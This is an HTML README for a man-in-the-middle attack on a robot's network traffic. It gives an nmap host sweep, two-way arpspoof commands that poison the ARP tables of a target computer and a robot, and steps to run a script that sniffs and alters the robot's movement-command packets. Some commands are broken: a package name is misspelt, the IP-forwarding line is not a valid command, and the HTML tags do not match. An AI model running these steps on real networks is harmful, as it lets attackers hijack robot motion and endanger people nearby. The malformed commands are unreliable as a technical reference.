<section>
    <h2>#Pre-requisites</h1>
    <article>
        The following software is required:
        <ul>
            <li>Python (preference >= 3.8)</li>
            <li>Scapy (2.4.5) -> <code>$ sudo apt install scapy && python -m pip install scapy</code> </li>
            <li>arpspoof (2.4) -> <code>$ sudo apt install dnsniff</code></li>
            <li>Turn off IP forwarding, if enabled -> <code>$ sudo net.ipv4.ip_forward=0</code></li>
        </ul>
    <article>
</secion>
<section>
    <h2>#Usage</h2>
    <article>
        The first step is to scan the network to find the target computers information. Nmap is a good tool for this (<code>$ nmap -sn 192.168.1.0/24</code>). Once you have the IP addresses of the computers, you can begin.<br>
        Firstly, you need to poison the ARP tables of both the target computer (TARGET_A) and robot (TARGET_B). To do this, run the following commands:<br>
        <code>$ sudo arpspoof -t TARGET_A_IP TARGET_B_IP</code> <br> 
        <code>$ sudo arpspoof -t TARGET_B_IP TARGET_A_IP</code> <br>
        If you don't have the MAC addresses of the computers, you can get them at this point using <code>$ arp</code>.<br>
        Next fill in the required information in the script <code>geometry_msgs_twist_pitm.py</code>.<br>
        Finally, you can run the script <code>geometry_msgs_twist_pitm.py</code> to sniff, manipulate, and forward packets.
    </article>
</section>
